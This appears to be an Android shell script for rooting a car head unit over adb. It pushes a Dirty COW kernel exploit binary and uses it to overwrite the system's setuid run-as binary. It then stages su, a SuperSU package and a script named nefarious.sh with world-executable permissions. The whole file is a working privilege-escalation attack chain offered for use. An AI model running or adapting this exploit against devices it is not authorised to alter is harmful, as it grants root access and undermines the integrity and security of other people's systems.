#!/bin/sh

#use this to test on vm
#ARCH="x86"

#use this on head unit
ARCH="armeabi-v7a"

adb push libs/$ARCH/dirtycow /data/local/tmp/dcow
adb shell 'chmod 777 /data/local/tmp/dcow'

adb push libs/$ARCH/run-as /data/local/tmp/run-as
adb shell '/data/local/tmp/dcow /data/local/tmp/run-as /system/bin/run-as'

adb shell 'mkdir /data/local/tmp/rootme/'
adb push nefarious.sh /data/local/tmp/rootme/
adb push su /data/local/tmp/rootme/
adb push SuperSU-v2.78.apk /data/local/tmp/rootme/

adb shell 'chmod 777 /data/local/tmp/rootme/nefarious.sh'
